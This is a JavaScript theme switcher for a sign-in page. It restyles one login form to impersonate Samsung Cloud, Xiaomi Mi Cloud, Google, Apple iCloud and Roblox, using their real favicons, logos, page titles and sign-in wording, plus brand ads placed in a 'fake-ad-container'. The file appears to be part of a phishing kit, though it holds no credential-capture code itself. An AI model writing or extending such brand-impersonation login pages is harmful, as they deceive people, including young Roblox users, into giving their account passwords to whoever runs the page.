/* --- START OF NEW FILE theme-switcher.js --- */

document.addEventListener('DOMContentLoaded', () => {
    const themeTrigger = document.getElementById('theme-trigger');
    const themeMenu = document.getElementById('theme-menu');
    const pageBody = document.getElementById('page-body');
    const favicon = document.getElementById('favicon');
    const themeSwitcher = document.getElementById('theme-switcher');
    const formTitle = document.getElementById('form-title');
    const formSubtitle = document.getElementById('form-subtitle');
    const formLogo = document.getElementById('form-logo');
    const fakeAdContainer = document.getElementById('fake-ad-container');

    const themeData = {
        default: {
            title: "Sign In - Cloud Services", favicon: "favicon.ico", name: "Default Cloud",
            formTitle: "Sign in to Your Cloud", formSubtitle: "Access your secure cloud storage.",
            logoHtml: '<i class="fas fa-cloud"></i>',
            adHtml: `<h4>Secure Cloud Backup</h4><p>Never lose a file again. Reliable storage for everyone.</p><a href="#" class="ad-link">Learn More »</a>`
        },
        samsung: {
            title: "Samsung Cloud - Sign In", favicon: "https://ik.imagekit.io/9llyyueko/STATIC%20IMAGES/Samsung_icon.svg.png", name: "Samsung Cloud",
            formTitle: "Sign in to Samsung Cloud", formSubtitle: "Your memories and data, securely stored.",
            logoHtml: '<i class="fas fa-mobile-screen-button"></i>',
            adHtml: `<img src="https://ik.imagekit.io/9llyyueko/STATIC%20IMAGES/Samsung_icon.svg.png" alt="Samsung Logo" class="ad-logo"><h4>Galaxy Ecosystem</h4><p>Seamlessly connect your Samsung devices with the cloud.</p><a href="#" class="ad-link">Discover Now »</a>`
        },
        xiaomi: {
            title: "Xiaomi Cloud - Sign In", favicon: "https://www.mi.com/favicon.ico", name: "Xiaomi Cloud",
            formTitle: "Sign in to Mi Cloud", formSubtitle: "Sync your data across devices.",
            logoHtml: '<i class="fab fa-xing"></i>',
            adHtml: `<img src="https://ik.imagekit.io/9llyyueko/STATIC%20IMAGES/Xiaomi_logo_(2021-).svg.png" alt="Xiaomi Logo" class="ad-logo"><h4>Smart Living</h4><p>Power your connected life with Mi Cloud integration.</p><a href="#" class="ad-link">Explore Features »</a>`
        },
        google: {
            title: "Google Cloud - Sign In", favicon: "https://www.google.com/favicon.ico", name: "Google Cloud",
            formTitle: "Sign in with Google", formSubtitle: "Access your Google Cloud services.",
            logoHtml: '<i class="fab fa-google"></i>',
            adHtml: `<img src="https://ik.imagekit.io/9llyyueko/STATIC%20IMAGES/7123025_logo_google_g_icon.png" alt="Google Logo" class="ad-logo"><h4>Build What's Next</h4><p>Leverage Google's infrastructure for your projects.</p><a href="#" class="ad-link">Go to Console »</a>`
        },
        apple: {
            title: "Sign in to iCloud", favicon: "https://www.apple.com/favicon.ico", name: "Apple iCloud",
            formTitle: "Sign in to iCloud", formSubtitle: "Use your Apple ID.",
            logoHtml: '<i class="fab fa-apple"></i>',
            adHtml: `<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/160px-Apple_logo_black.svg.png" alt="Apple Logo" class="ad-logo apple-ad-logo"><h4>Privacy. That’s iPhone.</h4><p>And iCloud. Your data is yours, protected and secure.</p><a href="#" class="ad-link">Learn about Apple Privacy »</a>`
        },
        roblox: {
            title: "Log In - Roblox", favicon: "https://www.roblox.com/favicon.ico", name: "Roblox",
            formTitle: "Log in to Roblox", formSubtitle: "Powering Imagination.", // A more impactful subtitle
            logoHtml: '<i class="fas fa-cube"></i>',
            adHtml: `<img src="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" alt="Roblox Logo" class="ad-logo"><h4>The Creator Economy</h4><p>Build, publish, and operate 3D immersive experiences.</p><a href="#" class="ad-link">Learn More »</a>`
        }
    };

    function applyTheme(themeName) {
        const theme = themeData[themeName] || themeData.default;
        pageBody.className = '';
        pageBody.classList.add(`theme-${themeName}-bg`);
        if (themeName !== 'default') {
            pageBody.classList.add(`theme-${themeName}`);
        }
        document.title = theme.title;
        favicon.href = theme.favicon;
        formTitle.textContent = theme.formTitle;
        formSubtitle.textContent = theme.formSubtitle;
        formLogo.innerHTML = theme.logoHtml;
        fakeAdContainer.innerHTML = theme.adHtml;
        localStorage.setItem('selectedTheme', themeName);
        themeMenu.classList.add('hidden');
    }

    themeTrigger.addEventListener('click', (event) => {
        event.stopPropagation();
        themeMenu.classList.toggle('hidden');
    });

    themeMenu.addEventListener('click', (event) => {
        const button = event.target.closest('button[data-theme]');
        if (button) {
            applyTheme(button.dataset.theme);
        }
    });

    document.addEventListener('click', (event) => {
        if (!themeSwitcher.contains(event.target)) {
            themeMenu.classList.add('hidden');
        }
    });

    const savedTheme = localStorage.getItem('selectedTheme') || 'default';
    applyTheme(savedTheme);
});